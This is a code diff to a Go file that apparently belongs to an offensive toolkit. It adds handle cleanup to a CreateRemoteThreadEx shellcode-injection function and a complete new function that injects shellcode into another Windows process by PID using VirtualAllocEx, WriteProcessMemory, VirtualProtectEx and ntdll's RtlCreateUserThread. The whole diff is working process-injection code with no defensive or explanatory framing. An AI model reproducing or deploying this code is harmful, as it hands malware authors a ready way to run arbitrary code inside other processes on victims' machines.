@@ -37,6 +37,7 @@ import (
 const (
 	MEM_COMMIT             	= 0x1000
 	MEM_RESERVE            	= 0x2000
+	MEM_RELEASE 			= 0x8000
 	PAGE_EXECUTE 			= 0x10
 	PAGE_EXECUTE_READWRITE 	= 0x40
 	PAGE_READWRITE 			= 0x04
@@ -119,6 +120,7 @@ func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
 	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
 	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
 	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
+	CloseHandle := kernel32.NewProc("CloseHandle")
 
 	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)
 
@@ -149,8 +151,89 @@ func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
 
 	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0,0,0)
 	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
-		return errors.New("Error calling errCreateRemoteThreadEx:\r\n" + errCreateRemoteThreadEx.Error())
+		return errors.New("Error calling CreateRemoteThreadEx:\r\n" + errCreateRemoteThreadEx.Error())
+	}
+
+	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
+	if errCloseHandle.Error() != "The operation completed successfully." {
+		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
 	}
 
 	return nil
 }
+
+// ExecuteShellcodeRtlCreateUserThread executes provided shellcode in the provided target process using the Windows RtlCreateUserThread call
+func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
+	kernel32 := windows.NewLazySystemDLL("kernel32")
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+
+	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	CloseHandle := kernel32.NewProc("CloseHandle")
+	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
+	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
+
+	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)
+
+	if errOpenProcess != nil {
+		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
+	}
+
+	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle),0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+	if errVirtualAlloc.Error() != "The operation completed successfully."  {
+		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
+	}
+
+	if addr == 0 {
+		return errors.New("VirtualAllocEx failed and returned 0")
+	}
+
+	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
+	if errWriteProcessMemory.Error() != "The operation completed successfully." {
+		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
+	}
+
+	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
+	if errVirtualProtectEx.Error() != "The operation completed successfully." {
+		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
+	}
+
+	/*
+	NTSTATUS
+	RtlCreateUserThread(
+		IN HANDLE Process,
+		IN PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL,
+		IN BOOLEAN CreateSuspended,
+		IN ULONG ZeroBits OPTIONAL,
+		IN SIZE_T MaximumStackSize OPTIONAL,
+		IN SIZE_T CommittedStackSize OPTIONAL,
+		IN PUSER_THREAD_START_ROUTINE StartAddress,
+		IN PVOID Parameter OPTIONAL,
+		OUT PHANDLE Thread OPTIONAL,
+		OUT PCLIENT_ID ClientId OPTIONAL
+		)
+	 */
+	var tHandle uintptr
+	_, _, errRtlCreateUserThread :=  RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)
+
+
+	if errRtlCreateUserThread.Error() != "The operation completed successfully." {
+		return errors.New("Error calling RtlCreateUserThread:\r\n" + errRtlCreateUserThread.Error())
+	}
+
+	_, _, errWaitForSingleObject := WaitForSingleObject.Call(tHandle, syscall.INFINITE)
+	if errWaitForSingleObject.Error() != "The operation completed successfully." {
+		return errors.New("Error calling WaitForSingleObject:\r\n" + errWaitForSingleObject.Error())
+	}
+
+	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
+	if errCloseHandle.Error() != "The operation completed successfully." {
+		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
+	}
+
+	return nil
+}
+// TODO always close handle during exception handling
